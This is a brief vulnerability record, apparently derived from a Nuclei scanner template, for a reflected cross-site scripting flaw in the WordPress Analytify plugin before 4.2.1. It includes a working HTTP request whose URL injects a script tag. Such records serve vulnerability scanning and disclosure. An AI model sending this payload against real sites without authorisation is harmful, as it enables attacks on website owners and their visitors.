# Vulnerability: Analytify <4.2.1 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`analytify-plugin-xss.yaml`)

## Description
WordPress Analytify 4.2.1 does not escape the current URL before outputting it back in a 404 page when the 404 tracking feature is enabled, leading to reflected cross-site scripting.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/aa404bb?a</script><script>alert(/XSS/)</script>
```

